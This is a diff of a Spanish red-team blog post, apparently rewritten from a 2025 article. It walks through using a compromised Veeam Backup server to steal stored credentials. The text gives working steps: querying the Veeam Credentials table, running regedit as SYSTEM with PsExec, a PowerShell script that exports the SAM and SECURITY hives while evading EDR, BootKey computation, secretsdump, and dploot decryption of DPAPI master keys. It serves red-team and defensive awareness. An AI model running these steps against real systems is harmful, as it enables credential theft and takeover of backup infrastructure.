@@ -7,79 +7,69 @@ tags: ["veeam", "dpapi", "credential-access", "edr-bypass", "active-directory", 
 categories: ["writeups"]
 summary: "Veeam Backup, ¿qué pasaría si esta solución de protección se convirtiera en la puerta de entrada para un actor malicioso? Dos aproximaciones para volcar la SAM y extraer las master keys de DPAPI evadiendo AV/EDR, usando Veeam como pivote hacia los servicios críticos."
 cover:
-  image: "image001.png"
+  image: "cover.png"
   alt: "Veeam Backup: de seguro a llave maestra del atacante"
   relative: true
 ShowToc: true
 TocOpen: false
 ---
 
-> Publicado originalmente en [Security Art Work](https://www.securityartwork.es/2025/05/05/veeam-backup/) (S2 Grupo) el 5 de mayo de 2025.
+> Esto no es contenido nuevo: es una adaptación de un artículo que escribí en su día y que se publicó originalmente en [Security Art Work](https://www.securityartwork.es/2025/05/05/veeam-backup/) (S2GRUPO) el 5 de mayo de 2025. He reescrito la redacción para darle el tono de este blog, pero el contenido técnico es el mismo.
 
-Muchos de vosotros seguro que conoceréis Veeam Backup, la solución de protección de datos que permite realizar copias de seguridad y recuperaciones en entornos virtuales, físicos, NAS y nativos de la nube. Esto se debe a que su facilidad de uso y eficiencia lo han convertido en un pilar fundamental en la estrategia de backup de muchas organizaciones.
+## Introducción
 
-En un contexto donde los ataques de ransomware están a la orden del día, Veeam Backup se ha consolidado como una herramienta esencial para la continuidad del negocio y la resiliencia ante la nueva oleada de amenazas que reciben las organizaciones de hoy en día.
+Seguro que conoces Veeam Backup. Es la solución de protección de datos que hace copias de seguridad y recuperaciones en entornos virtuales, físicos, NAS y en la nube. Su facilidad de uso y su eficiencia lo han convertido en una pieza central de la estrategia de backup de muchas organizaciones, y más ahora, con el ransomware a la orden del día y la continuidad del negocio en el punto de mira.
 
-Sin embargo, ¿qué pasaría si esta solución de protección se convirtiera en la puerta de entrada para un actor malicioso?
+Pero hagámonos una pregunta incómoda: ¿y si esa misma solución que te protege se convirtiera en la puerta de entrada del atacante?
 
-Una de las grandes ventajas de Veeam Backup es su capacidad para integrarse fácilmente con otras soluciones clave en entornos IT. Es común verlo conectado con vSphere, la plataforma de virtualización de VMware, o con sistemas NAS, utilizados para el almacenamiento de datos en red.
+Una de las grandes ventajas de Veeam es lo bien que se integra con el resto del entorno: vSphere (la plataforma de virtualización de VMware), sistemas NAS para almacenamiento en red o soluciones cloud como Azure. Toda esa automatización es comodísima, pero tiene letra pequeña: la autenticación. Para hablar con esos servicios, Veeam necesita credenciales. Y por el tipo de tareas que ejecuta, esas credenciales suelen tener privilegios elevados.
 
-Además de ello, su compatibilidad con múltiples soluciones cloud ampliamente utilizadas, como es el caso de Azure, lo convierte en una pieza fundamental para la gestión eficiente y segura de copias de seguridad en la nube.
+Ahí está el problema. Veeam no es crítico solo por lo que hace, sino por lo que guarda: un cofre de credenciales con acceso a media infraestructura. Para un atacante, eso es un objetivo de primera.
 
-En el mundo IT, la automatización de tareas, especialmente cuando involucra la integración entre distintos softwares, conlleva beneficios significativos. Sin embargo, también implica ciertas condiciones, en su mayoría relacionadas con el proceso de autenticación. Es fundamental evaluar estos aspectos, ya que pueden influir en la seguridad, el control de acceso y la privacidad de los datos, por lo que es necesario sopesar sus ventajas y posibles riesgos antes de implementarlos.
+Y conviene pararse en el impacto, porque es lo que de verdad importa. Quien controla Veeam no se lleva una credencial suelta: se lleva las llaves de vSphere (y con ellas, de todas las máquinas virtuales), de los NAS donde viven los datos y de la nube. Pero hay algo peor. Veeam es tu plan B, el que se supone que te salva cuando entra un ransomware. Si el atacante lo compromete, no solo puede cifrar tus datos: puede borrar o cifrar también las copias de seguridad y dejarte sin nada a lo que volver. Pasa de robarte a quitarte la red de seguridad. Por eso comprometer Veeam no es un hallazgo más en un informe: muchas veces es el game over de la organización.
 
-En el caso de Veeam Backup, su funcionamiento requiere de credenciales que le permiten interactuar y acceder con los servicios mencionados previamente. Además, debido a las acciones que ejecuta, estas credenciales a menudo deben contar con un nivel elevado de privilegios.
+![Veeam, el seguro de la organización, convertido en la llave maestra que abre vSphere, NAS, la nube y las credenciales](cover.png)
 
-Esto convierte a Veeam Backup en un objetivo especialmente atractivo para los actores maliciosos, no solo por su papel crítico en la infraestructura IT, sino también por el valor añadido que representa: el almacenamiento de credenciales que le permiten comunicarse con otros servicios.
+¿Y dónde guarda Veeam esas credenciales? En su base de datos de configuración (*Veeam Backup & Replication Configuration Database*), donde almacena la información de la infraestructura de respaldo, las tareas, las sesiones y, entre otras cosas, las credenciales para conectarse a otros servicios. Esa base de datos puede vivir en un Microsoft SQL Server (MSSQL) o en PostgreSQL, en local (el mismo servidor que Veeam) o en remoto.
 
-Pero la pregunta es: ¿dónde almacena Veeam Backup estas credenciales?
+Guardar credenciales en texto plano no es opción, así que Veeam usa la Data Protection API (DPAPI) de Microsoft para cifrarlas y guardarlas como blobs de datos. Para quien no la conozca: DPAPI es una API de cifrado de Windows, muy usada junto al Windows Credential Manager, donde guarda credenciales de navegadores, de Remote Desktop Protocol (RDP) y de otras aplicaciones.
 
-Veeam Backup utiliza la base de datos *Veeam Backup & Replication Configuration Database* para almacenar información sobre la infraestructura de respaldo, las tareas, las sesiones y otros datos de configuración, como, por ejemplo, las credenciales utilizadas para la interconexión con otras soluciones.
+Entonces, ¿cómo aprovecha un adversario todo esto? Tanto un atacante real como un operador de Red Team trabajan parecido: con un objetivo claro, de forma sigilosa y sin levantar alarmas. Y un sistema que gestiona backups e interactúa con servicios tan críticos como vSphere es, si cae, una brecha de altísimo impacto.
 
-Esta base de datos puede alojarse en un servidor Microsoft SQL Server (MSSQL) o PostgreSQL, ya sea de forma local, es decir, en el mismo servidor donde se ejecuta Veeam Backup, o de manera remota.
+La diferencia está en la intención. El adversario busca hacer daño, por ejemplo cifrando datos (T1486 - Data Encrypted for Impact) para tumbar la disponibilidad del negocio. El operador de Red Team, dentro de un ejercicio de simulación de adversarios, hace lo mismo pero para demostrar el impacto real que tendría ese atacante, partiendo de un escenario y unos objetivos pactados.
 
-Dado que almacenar credenciales en texto claro no es una opción segura hoy en día, Veeam Backup utiliza la conocida Data Protection API (DPAPI) de Microsoft para cifrarlas y guardarlas como *blobs* (bloques) de datos.
+Muchas organizaciones confían en su EDR para frenar esto. Pero, ¿y si tanto el atacante como el Red Team dan por hecho que ese EDR está ahí y diseñan sus técnicas precisamente para evadirlo?
 
-Para quienes no estén familiarizados con esta tecnología, Data Protection API (DPAPI) es una interfaz de programación de aplicaciones utilizada en sistemas Windows, principalmente para operaciones de cifrado. Su uso más común es junto a Windows Credential Manager, donde se encarga de almacenar credenciales de navegadores, servicios como Remote Desktop Protocol (RDP) y otras aplicaciones.
-
-Ahora bien, ¿cómo puede aprovechar un adversario esta situación?
-
-Como bien es sabido, tanto los actores maliciosos como los operadores Red Team suelen tener un objetivo claro en mente y lo ejecutan de manera eficaz y sigilosa, evitando activar alarmas. Estos objetivos suelen estar relacionados con el compromiso de sistemas de almacenamiento de datos, copias de seguridad o incluso la implementación de activos. Por ello, dado el volumen de información crítica que gestiona la solución Veeam Backup (realización de backups, interacción con servicios críticos como vSphere…), puede convertirse en una brecha de alto impacto para la organización.
-
-Un adversario busca cumplir su propósito perjudicando a la organización, por ejemplo, cifrando datos (**T1486**) para interrumpir la disponibilidad de las operaciones. Un operador Red Team, dentro del ámbito de un ejercicio de simulación de adversarios, tiene la misión de demostrar el impacto que un atacante real podría generar sobre el negocio de la organización que lo contrata, partiendo de un escenario y unos objetivos predefinidos.
-
-Muchas organizaciones confían en diferentes tipos de soluciones de seguridad como los sistemas de Endpoint Detection and Response (EDR) para frenar este tipo de amenazas.
-
-Sin embargo, ¿se ha considerado que tanto los actores maliciosos como los operadores de Red Team asumen la existencia de estas soluciones y diseñan sus tácticas y técnicas para evadirlas?
-
-En esta ocasión, se presentarán dos aproximaciones utilizadas durante uno de los últimos ejercicios realizados, que han permitido el volcado de Security Account Manager (SAM) (**T1003.002**) y el acceso a las master keys utilizadas por el Data Protection API (DPAPI) para el cifrado y descifrado de blobs de datos en entornos que contaban con Antivirus (Windows Defender, BitDefender) y Endpoint Detection and Response (EDR) (CrowdStrike). Mediante estas dos aproximaciones un atacante podría usar Veeam Backup como puerta de entrada para comprometer y obtener el control de múltiples servicios críticos de la organización.
+En este artículo verás dos aproximaciones, usadas en uno de los últimos ejercicios, que permitieron volcar la Security Account Manager (SAM) (T1003.002 - Security Account Manager) y acceder a las master keys que DPAPI usa para cifrar y descifrar los blobs, todo ello en entornos con antivirus (Windows Defender, BitDefender) y EDR (CrowdStrike). Con ellas, un atacante podría usar Veeam Backup como puerta de entrada para comprometer y controlar múltiples servicios críticos de la organización.
 
 ## Prueba de Concepto (PoC)
 
-Es importante destacar que, para esta prueba de concepto (PoC), se asumirá que el atacante ya ha obtenido control con privilegios elevados sobre el equipo donde está desplegada la solución de Veeam Backup y tiene acceso a este.
+Para esta PoC partimos de un supuesto: el atacante ya tiene control con privilegios elevados sobre el equipo donde corre Veeam Backup y acceso a él. Y un detalle que no es menor: el entorno de las pruebas tenía el Endpoint Detection and Response (EDR) de CrowdStrike vigilando.
 
-También es importante destacar que el entorno donde se han realizado las pruebas contaba con el Endpoint Detection and Response (EDR) de CrowdStrike.
+### Localizar el servidor de Veeam
 
-El primer paso es identificar el servidor donde está desplegada la solución de Veeam Backup. Una posible vía es el uso de BloodHound (**S0521**), una herramienta especializada en la enumeración de los entornos Active Directory (AD), que, entre otras cosas, permite visualizar los Service Principal Names (SPNs) asociados a los objetos del dominio.
+Lo primero es localizar el servidor donde vive Veeam. Una vía cómoda es BloodHound (S0521 - BloodHound), que enumera entornos Active Directory (AD) y, entre otras cosas, te deja ver los Service Principal Names (SPNs) asociados a los objetos del dominio.
 
 ![Enumeración de SPNs con BloodHound para localizar el servidor de Veeam](image003.png)
 
-Una vez identificado el servidor, será necesario conectarse a la máquina objetivo, como, por ejemplo, mediante Remote Desktop Protocol (RDP) (**T1021.001**), utilizando una cuenta con privilegios elevados.
+Con el servidor localizado, toca conectarse a la máquina objetivo, por ejemplo por Remote Desktop Protocol (RDP) (T1021.001 - Remote Desktop Protocol) con una cuenta de privilegios elevados.
 
-Tras esto, el siguiente paso será identificar la ubicación, el nombre (tanto de la instancia como de la propia base de datos) y el tipo de base de datos utilizada por Veeam Backup. Esto se consigue accediendo a la siguiente clave del registro de Windows:
+### Acceder a la base de datos y extraer las credenciales
+
+El siguiente paso es averiguar dónde está la base de datos de Veeam, cómo se llama (instancia y base de datos) y de qué tipo es. Todo eso está en esta clave del registro de Windows:
 
 ```text
 HKEY_LOCAL_MACHINE\SOFTWARE\Veeam\Veeam Backup and Replication
 ```
 
-A continuación, será necesario acceder (**T1005**) a la base de datos utilizando cualquier gestor de bases de datos compatible con Microsoft SQL Server (MSSQL) o PostgreSQL, dependiendo del tipo identificado previamente. Algunas herramientas portables útiles son:
+Con esos datos, accedemos (T1005 - Data from Local System) a la base de datos con cualquier gestor compatible con Microsoft SQL Server (MSSQL) o PostgreSQL, según el tipo que hayamos visto. Un par de herramientas portables que van bien:
 
-- [Azure Data Studio](https://learn.microsoft.com/en-us/azure-data-studio/)
-- [DBeaver](https://dbeaver.io/)
+- [Azure Data Studio](https://learn.microsoft.com/en-us/azure-data-studio/): cliente multiplataforma de Microsoft para Microsoft SQL Server y PostgreSQL.
+- [DBeaver](https://dbeaver.io/): cliente universal de bases de datos, gratuito y portable.
 
 ![Clave de registro con la configuración de la base de datos de Veeam](image005.png)
 
-Conseguido el acceso, el siguiente paso será enumerar las credenciales almacenadas en la base de datos de Veeam Backup, las cuales se encuentran cifradas. Para su obtención, ejecutar la siguiente consulta SQL:
+Ya dentro, toca enumerar las credenciales que Veeam guarda en su base de datos, que están cifradas. Para sacarlas, esta consulta SQL:
 
 ```sql
 SELECT * FROM VeeamBackup.dbo.Credentials
@@ -87,21 +77,23 @@ SELECT * FROM VeeamBackup.dbo.Credentials
 
 ![Credenciales cifradas almacenadas en la base de datos de Veeam](image007.png)
 
-Una vez obtenidas las credenciales, se procederá con la segunda fase del ataque: la extracción de las master keys del Data Protection API (DPAPI), utilizadas para cifrar/descifrar las credenciales.
+### Volcar la SAM
 
-En esta ocasión, aprovechando los privilegios elevados sobre el activo donde está desplegado el servicio de Veeam Backup, se realizará un volcado de la Security Account Manager (SAM) (**T1003.002**). A partir de este volcado, se obtendrán los valores `DPAPI_MACHINEKEY` y `DPAPI_USERKEY`, los cuales serán utilizados para extraer las master keys asociadas a la cuenta máquina.
+Con las credenciales cifradas en la mano, empieza la segunda fase: extraer las master keys del Data Protection API (DPAPI), las que cifran y descifran esas credenciales.
 
-Para el volcado de la Security Account Manager (SAM) (**T1003.002**), se propone la siguiente aproximación:
+Aprovechando los privilegios elevados sobre el servidor de Veeam, vamos a volcar la Security Account Manager (SAM) (T1003.002 - Security Account Manager). De ese volcado sacaremos los valores `DPAPI_MACHINEKEY` y `DPAPI_USERKEY`, que luego usaremos para extraer las master keys de la cuenta máquina.
 
-Aprovechando el acceso por Remote Desktop Protocol (RDP) (**T1021.001**), se montará un recurso compartido en la máquina víctima, el cual contendrá la herramienta PsExec (**S0029**) de la suite de SysInternals de Microsoft.
+La aproximación para volcar la SAM es esta:
 
-A través de esta herramienta, será necesario ejecutar el RegEdit (Editor de Registros) con privilegios de `NT Authority\System`, ya que es necesaria la ejecución con este nivel de privilegios para el volcado de la Security Account Manager (SAM) (**T1003.002**).
+Con el acceso por Remote Desktop Protocol (RDP) (T1021.001 - Remote Desktop Protocol), montamos un recurso compartido en la máquina víctima con la herramienta PsExec (S0029 - PsExec), de la suite SysInternals de Microsoft.
+
+Con PsExec lanzamos el RegEdit (Editor de Registros) como `NT Authority\System`: necesitamos ese nivel de privilegio para volcar la SAM.
 
 ```cmd
 PsExec64.exe -s -i regedit
 ```
 
-Una vez abierto el Editor de Registros, exportar en formato `.reg` los siguientes registros:
+Con el Editor de Registros abierto, exporta en formato `.reg` estos registros:
 
 ```text
 HKEY_LOCAL_MACHINE\SAM
@@ -110,7 +102,7 @@ HKEY_LOCAL_MACHINE\SECURITY
 
 ![Exportación de las claves SAM y SECURITY desde RegEdit](image009.png)
 
-Por otro lado, extraer en formato `.txt` el siguiente registro:
+Y, por otro lado, exporta en formato `.txt` este otro:
 
 ```text
 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa
@@ -118,11 +110,11 @@ HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa
 
 ![Exportación del registro LSA en formato texto](image011.png)
 
-Para exportar claves, haz clic derecho sobre el registro, selecciona la opción *“Exportar”* y elige el formato para guardarlo (`.reg` o `.txt`).
+Para exportar una clave: clic derecho sobre el registro, *“Exportar”* y eliges el formato (`.reg` o `.txt`).
 
 ![Menú contextual de exportación en RegEdit](image013.png)
 
-Dado que los registros `SAM` y `SECURITY` solo pueden volcarse en formato binario, se utiliza el siguiente script de PowerShell para reubicarlos temporalmente bajo `HKCU\HELLO`, reimportarlos y guardarlos como ficheros `.hive`, evitando así las protecciones que vigilan el acceso directo a estas claves:
+Los registros `SAM` y `SECURITY` solo se pueden volcar en binario, así que usamos este script de PowerShell para moverlos temporalmente a `HKCU\HELLO`, reimportarlos y guardarlos como ficheros `.hive`. Así esquivamos las protecciones que vigilan el acceso directo a estas claves:
 
 ```powershell
 # Ubicación de los ficheros exportados
@@ -156,7 +148,7 @@ Write-Output "Removing temporary HKCU\HELLO hives"
 reg delete HKEY_CURRENT_USER\HELLO /f
 ```
 
-Por otro lado, del registro LSA exportado en formato `.txt`, se deberán extraer los siguientes valores almacenados en el atributo *Class Name*:
+Del registro LSA que exportamos en `.txt` necesitamos cuatro valores, guardados en el atributo *Class Name*:
 
 ```text
 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\GBG
@@ -167,7 +159,9 @@ HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Skew1
 
 ![Valores Class Name de las claves LSA: GBG, Data, JD y Skew1](image015.png)
 
-Los valores obtenidos en el paso previo deberán de ser introducidos en el siguiente script con el propósito de obtener la BootKey que permita el desencriptado de los datos del volcado de Security Account Manager (SAM) (**T1003.002**) realizado.
+### Obtener la BootKey y los hashes
+
+Esos cuatro valores van al siguiente script, que calcula la BootKey necesaria para descifrar los datos del volcado de la SAM (T1003.002 - Security Account Manager).
 
 ```python
 # Valores hexadecimales para JD, Skew1, GBG y Datos
@@ -191,23 +185,25 @@ print("Bootkey:", bootkey.hex())
 
 ![Obtención de la BootKey a partir de los valores de LSA](image017.png)
 
-Finalmente, será posible acceder a los hashes almacenados en la Security Account Manager (SAM) de forma local. Esto es posible con herramientas como impacket-secretsdump (**S0357**) o similares.
+Con la BootKey ya podemos acceder a los hashes de la SAM en local, con herramientas como impacket-secretsdump (S0357 - impacket-secretsdump) o similares.
 
 ```bash
 impacket-secretsdump -sam SAM.hive -security SECURITY.hive -bootkey $BOOTKEY LOCAL
 ```
 
-De entre los valores obtenidos, son necesarias las claves mencionadas previamente: `DPAPI_MACHINEKEY` y `DPAPI_USERKEY`, que serán utilizadas para la extracción de las master keys de la cuenta máquina. Esta extracción se realizará mediante la herramienta [dploot](https://github.com/zblurx/dploot).
+### Extraer las master keys de DPAPI
 
-Esta herramienta permite la interacción con el Windows Credential Manager y Data Protection API (DPAPI) de forma local, es decir, es posible montar en una máquina controlada el sistema de archivos de la máquina víctima y con la herramienta realizar la extracción de las master keys, por ejemplo.
+De todo lo que devuelve secretsdump nos quedamos con las dos claves que ya mencionamos: `DPAPI_MACHINEKEY` y `DPAPI_USERKEY`. Con ellas extraeremos las master keys de la cuenta máquina, y para eso usamos [dploot](https://github.com/zblurx/dploot).
 
-Para el montaje del sistema de archivos, esta es una posible aproximación:
+dploot interactúa con el Windows Credential Manager y con el Data Protection API (DPAPI) en local: puedes montar en una máquina que controlas el sistema de archivos de la víctima y, desde ahí, extraer las master keys.
+
+Para montar el sistema de archivos, una aproximación posible:
 
 ```bash
 sudo mount -t cifs //$IP/$RECURSO /mnt/tmp -o username=$USUARIO,password=$CONTRASEÑA,domain=$DOMINIO
 ```
 
-Montado el sistema de archivos de la máquina víctima, se deberá de realizar la extracción de las master keys de la cuenta máquina, ya que estas son las claves con las que Veeam Backup cifra las credenciales, por lo que son necesarias para el descifrado.
+Con el sistema de archivos montado, extraemos las master keys de la cuenta máquina: son las claves con las que Veeam cifra las credenciales, así que las necesitamos para descifrarlas.
 
 ```bash
 dploot machinemasterkeys -root /mnt/tmp -u $USUARIO -p $PASSWORD -t LOCAL \
@@ -216,9 +212,11 @@ dploot machinemasterkeys -root /mnt/tmp -u $USUARIO -p $PASSWORD -t LOCAL \
 
 ![Extracción de las master keys de la cuenta máquina con dploot](image019.png)
 
-Una vez extraídas las master keys, el último paso es descifrar los blobs de datos, siendo estos las credenciales obtenidas previamente del *Veeam Backup & Replication Configuration Database*.
+### Descifrar las credenciales
 
-La herramienta lleva a cabo un proceso similar a un ataque de fuerza bruta, probando cada una de las master keys almacenadas en el archivo proporcionado contra el blob hasta encontrar la clave correcta que permita descifrar la credencial.
+Con las master keys ya extraídas, el último paso es descifrar los blobs de datos, que no son otra cosa que las credenciales que sacamos antes del *Veeam Backup & Replication Configuration Database*.
+
+dploot hace algo parecido a una fuerza bruta: prueba cada master key del archivo contra el blob hasta dar con la que lo descifra.
 
 ```bash
 dploot blob -blob "$BLOB" -mkfile $ARCHIVO_MASTERKEYS -t LOCAL
@@ -226,15 +224,15 @@ dploot blob -blob "$BLOB" -mkfile $ARCHIVO_MASTERKEYS -t LOCAL
 
 ![Descifrado del blob y obtención de la credencial en claro](image022.png)
 
-Tras esto, es posible acceder a todos los servicios críticos conectados con el servicio de Veeam Backup, consiguiendo control y privilegios elevados sobre el entorno IT y siendo capaz de centrar sus objetivos en el negocio de la organización.
+Y con esas credenciales en claro se abre la puerta a todos los servicios críticos conectados a Veeam: control y privilegios elevados sobre el entorno IT, y vía libre para ir a por los objetivos de negocio de la organización.
 
 ## Conclusión
 
-Este ejemplo ha evidenciado cómo un adversario puede llegar a tomar el control de la infraestructura IT de una organización, incluso cuando esta cuenta con una solución de seguridad implementada, como es el caso de un Endpoint Detection and Response (EDR).
+Este ejemplo deja claro cómo un adversario puede acabar tomando el control de la infraestructura IT de una organización, incluso con una solución de seguridad como un Endpoint Detection and Response (EDR) de por medio.
 
-Se ha demostrado cómo un software diseñado originalmente para proteger los datos de la organización contra ataques, como el ransomware, puede convertirse en una vía de acceso para los atacantes, permitiéndoles comprometer múltiples servicios críticos, generando una brecha de alto impacto para la organización.
+Y, sobre todo, deja una idea incómoda: un software pensado para proteger los datos frente a ataques como el ransomware puede convertirse en la vía de entrada del atacante, dándole acceso a múltiples servicios críticos y abriendo una brecha de alto impacto. La herramienta que te salva es también la que, mal protegida, te hunde.
 
-## Recursos adicionales
+## Referencias
 
-- [dploot](https://github.com/zblurx/dploot)
-- [Bypassing EDR to dump LSA secrets](https://www.orangecyberdefense.com/global/blog/cybersecurity/bypassing-edr-to-dump-lsa-secrets)
+1. dploot — herramienta para interactuar con el Windows Credential Manager y el Data Protection API (DPAPI), extraer las master keys y descifrar los blobs. [github.com/zblurx/dploot](https://github.com/zblurx/dploot)
+2. Orange Cyberdefense — _Bypassing EDR to dump LSA secrets_. [orangecyberdefense.com](https://www.orangecyberdefense.com/global/blog/cybersecurity/bypassing-edr-to-dump-lsa-secrets)
